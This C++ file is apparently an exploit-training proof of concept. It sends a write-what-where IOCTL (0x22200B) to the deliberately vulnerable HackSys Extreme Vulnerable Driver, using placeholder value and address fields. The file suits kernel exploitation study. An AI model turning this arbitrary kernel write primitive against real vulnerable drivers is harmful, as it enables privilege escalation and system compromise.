#include <iostream>
#include <Windows.h>
#define IOCTL_CODE 0x22200B

typedef struct _WRITE_WHAT_WHERE{
    ULONG64 * What;
    ULONG64* Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

int main() {
    WRITE_WHAT_WHERE DriverParams = { 0 };
    ULONG64 ValueToWrite = 0x99AABBCCDDEEFF00;
    DriverParams.Where = (ULONG64*)0x1122334455667788;
    DriverParams.What = &ValueToWrite;
    DWORD BytesReturned = 0;
    HANDLE DriverHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        printf("[-] DriverHandle = INVALID_HANDLE_VALUE\n");
        return FALSE;
    }
    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, &DriverParams, sizeof(DriverParams), NULL, NULL, &BytesReturned, NULL)) {
        printf("[-] Driver operation failed\n");
        CloseHandle(DriverHandle);
        return FALSE;
    }
    printf("[+] Driver operation succeeded\n");
    CloseHandle(DriverHandle);
    return TRUE;
}